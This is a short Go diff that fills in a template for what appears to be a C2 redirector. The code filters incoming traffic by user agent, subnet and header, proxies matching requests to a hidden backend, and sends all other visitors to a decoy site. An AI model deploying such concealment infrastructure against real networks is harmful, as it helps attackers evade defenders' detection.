@@ -16,7 +16,7 @@ type Prox struct {
 }
 
 func validUA(userAgent string) bool {
-	ua := "{{.RestrictedUA}}"
+	ua := "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like  Gecko"
 	if ua != "" && ua != userAgent {
 		return false
 	}
@@ -24,7 +24,7 @@ func validUA(userAgent string) bool {
 }
 
 func validIP(remoteIP string) bool {
-	subnet := "{{.RestrictedSubnet}}"
+	subnet := ""
 	if len(subnet) > 8 {
 		_, cidr, err := net.ParseCIDR(subnet)
 		if err != nil {
@@ -39,7 +39,7 @@ func validIP(remoteIP string) bool {
 
 //TODO: Add header templating
 func validHeader(remoteHeader http.Header) bool {
-	header, value := "{{.HeaderName}}", "{{.HeaderValue}}"
+	header, value := "", ""
 	if header != "" && value != "" {
 		if remoteHeader.Get(header) != value {
 			return false
@@ -58,14 +58,14 @@ func New(target string) *Prox {
 func (p *Prox) handle(w http.ResponseWriter, r *http.Request) {
 	// call to magic method from ReverseProxy object
 	if !validUA(r.UserAgent()) || !validIP(r.RemoteAddr) || !validHeader(r.Header) {
-		http.Redirect(w, r, "{{.DefaultRedirect}}", 301)
+		http.Redirect(w, r, "https://inbox.google.com", 301)
 	} else {
 		p.proxy.ServeHTTP(w, r)
 	}
 }
 
 func init() {
-	proxy := New("{{.C2Url}}")
+	proxy := New("https://tumblr.com")
 
 	// server
 	http.HandleFunc("/", proxy.handle)
